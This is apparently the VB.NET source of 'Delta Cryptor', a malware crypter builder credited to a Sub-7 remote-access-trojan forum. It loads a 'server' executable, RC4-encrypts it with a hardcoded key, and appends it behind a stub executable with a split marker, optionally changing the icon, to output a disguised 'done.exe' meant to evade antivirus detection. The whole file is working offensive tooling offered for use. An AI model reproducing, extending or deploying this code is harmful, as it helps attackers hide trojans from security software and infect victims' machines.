Imports fLaSh.Dissembler
Imports System.Text


Public Class Form1

    Private Input_file As String
    Private Input_icon As String


    Dim drag As Boolean
    Dim mousex As Integer
    Dim mousey As Integer

    Private Sub BitdefenderButton2_Click(sender As Object, e As EventArgs) Handles BitdefenderButton2.Click

        Using Ofd As New OpenFileDialog
            With Ofd
                .Title = My.Application.Info.Title
                .Filter = "Server|*.exe"
                .ShowDialog()
            End With
            If Ofd.FileName <> String.Empty Then
                Input_file = Ofd.FileName
                TextBox1.Text = Input_file
                Label2.Text = "Status: " & Ofd.SafeFileName & " waiting to be crypted..."
            End If
        End Using
    End Sub

    Private Sub BitdefenderButton3_Click(sender As Object, e As EventArgs) Handles BitdefenderButton3.Click
        MessageBox.Show("For Sub-7.net by hplus :: Enjoy this release! Thanks go to Kan3, Diablo, Ethernal Five, and many others!",
            "About Delta Cryptor",
        MessageBoxButtons.OK,
        MessageBoxIcon.Information,
        MessageBoxDefaultButton.Button1)
    End Sub

    Private Sub BitdefenderButton1_Click(sender As Object, e As EventArgs) Handles BitdefenderButton1.Click

        Timer1.Enabled = True

    End Sub

    Private Sub BitdefenderButton4_Click(sender As Object, e As EventArgs) Handles BitdefenderButton4.Click
        Using Ofd1 As New OpenFileDialog
            With Ofd1
                .Title = My.Application.Info.Title
                .Filter = "Icon|*.ico"
                .ShowDialog()
            End With
            If Ofd1.FileName <> String.Empty Then
                Label4.Text = Ofd1.SafeFileName
                Input_icon = Ofd1.FileName
            End If
        End Using
    End Sub

    Private Sub BitdefenderForm1_MouseDown(sender As Object, e As MouseEventArgs) Handles BitdefenderForm1.MouseDown
        drag = True
        mousex = Windows.Forms.Cursor.Position.X - Me.Left
        mousey = Windows.Forms.Cursor.Position.Y - Me.Top
    End Sub

    Private Sub BitdefenderForm1_MouseMove(sender As Object, e As MouseEventArgs) Handles BitdefenderForm1.MouseMove
        If drag Then
            Me.Top = Windows.Forms.Cursor.Position.Y - mousey
            Me.Left = Windows.Forms.Cursor.Position.X - mousex
        End If
    End Sub

    Private Sub BitdefenderForm1_MouseUp(sender As Object, e As MouseEventArgs) Handles BitdefenderForm1.MouseUp
        drag = False
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Icon = My.Resources.dpapimig_64
    End Sub

    Public Shared Function RC4(ByVal hack As String, ByVal hound As String) As String
        Dim oo As Integer = 0
        Dim hh As Integer = 0
        Dim sstring As New StringBuilder
        Dim rr As String = String.Empty
        Dim ss As Integer() = New Integer(256) {}
        Dim key As Integer() = New Integer(256) {}
        Dim ilength As Integer = hound.Length
        Dim a As Integer = 0
        While a <= 255
            Dim tmp As Char = (hound.Substring((a Mod ilength), 1).ToCharArray()(0))
            key(a) = Microsoft.VisualBasic.Strings.Asc(tmp)
            ss(a) = a
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        Dim x As Integer = 0
        Dim b As Integer = 0
        While b <= 255
            x = (x + ss(b) + key(b)) Mod 256
            Dim swap As Integer = ss(b)
            ss(b) = ss(x)
            ss(x) = swap
            System.Math.Max(System.Threading.Interlocked.Increment(b), b - 1)
        End While
        a = 1
        Dim rrcc44 As Integer = hack.Length
        While a <= rrcc44
            Dim ootmp As Integer = 0
            oo = (oo + 1) Mod 256
            hh = (hh + ss(oo)) Mod 256
            ootmp = ss(oo)
            ss(oo) = ss(hh)
            ss(hh) = ootmp
            Dim k As Integer = ss((ss(oo) + ss(hh)) Mod 256)
            Dim cctmp As Char = hack.Substring(a - 1, 1).ToCharArray()(0)
            ootmp = Asc(cctmp)
            Dim hackhound As Integer = ootmp Xor k
            sstring.Append(Chr(hackhound))
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        rr = sstring.ToString
        sstring.Length = 0
        Return rr
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Label4.Text = "No icon selected. Default will be used." = False Then
            Try
                Dim oIconFilenathu As New IconFile(Input_icon)
                Dim groupIconResource As GroupIconResource = oIconFilenathu.ConvertToGroupIconResource()
                groupIconResource.SaveTo("9372.exe")

                Dim split As String = "424234232dd2d32333234f"
                FileOpen(1, Input_file, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                Dim datei As String
                datei = Space(LOF(1))
                FileGet(1, datei)
                FileClose(1)
                FileOpen(2, Application.StartupPath & "\9372.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                Dim stub As String
                stub = Space(LOF(2))
                FileGet(2, stub)
                FileClose(2)
                FileOpen(3, Application.StartupPath & "\Output\done.exe", OpenMode.Binary, OpenAccess.Write, OpenShare.Default)
                FilePut(3, stub & split & RC4(datei, "UAUAYwyhausid32E2Isisd"))
                FileClose(3)

                Label2.Text = "Status: File crypted!"
            Catch
                Label2.Text = "FAILED!"
            End Try
        Else

            Try

                Dim split As String = "424234232dd2d32333234f"
                FileOpen(1, Input_file, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                Dim datei As String
                datei = Space(LOF(1))
                FileGet(1, datei)
                FileClose(1)
                FileOpen(2, Application.StartupPath & "\9372.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                Dim stub As String
                stub = Space(LOF(2))
                FileGet(2, stub)
                FileClose(2)
                FileOpen(3, Application.StartupPath & "\Output\done.exe", OpenMode.Binary, OpenAccess.Write, OpenShare.Default)
                FilePut(3, stub & split & RC4(datei, "UAUAYwyhausid32E2Isisd"))
                FileClose(3)

                Label2.Text = "Status: File crypted!"
            Catch
                Label2.Text = "FAILED!"
            End Try
        End If
        Timer1.Enabled = False
    End Sub
End Class